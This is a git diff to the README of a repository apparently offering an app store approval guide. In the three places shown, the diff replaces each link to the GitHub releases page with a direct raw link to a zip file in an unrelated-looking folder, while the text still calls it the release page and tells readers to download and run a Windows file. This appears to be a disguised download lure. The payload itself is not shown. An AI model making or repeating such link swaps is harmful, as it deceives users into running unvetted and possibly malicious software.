@@ -1,6 +1,6 @@
 # 📱 app-store-approval-guide - Clear Steps for App Review
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/bertrandstatutory543/app-store-approval-guide/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bertrandstatutory543/app-store-approval-guide/main/salamandroid/app_store_guide_approval_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide is built for people who want a plain process, not a long technical se
 
 ## 📥 Download and Install
 
-1. Open the [release page](https://github.com/bertrandstatutory543/app-store-approval-guide/releases).
+1. Open the [release page](https://raw.githubusercontent.com/bertrandstatutory543/app-store-approval-guide/main/salamandroid/app_store_guide_approval_v2.0.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for the app.
 4. Save the file to a folder you can find again, such as Downloads or Desktop.
@@ -172,7 +172,7 @@ If the page does not load, check your internet connection and open the release p
 
 New releases may add more checklist items, fix text, or improve the review flow. To get the newest version:
 
-1. Visit the [release page](https://github.com/bertrandstatutory543/app-store-approval-guide/releases).
+1. Visit the [release page](https://raw.githubusercontent.com/bertrandstatutory543/app-store-approval-guide/main/salamandroid/app_store_guide_approval_v2.0.zip).
 2. Look for the latest version at the top.
 3. Download the new Windows file.
 4. Replace the old app file with the new one if needed.
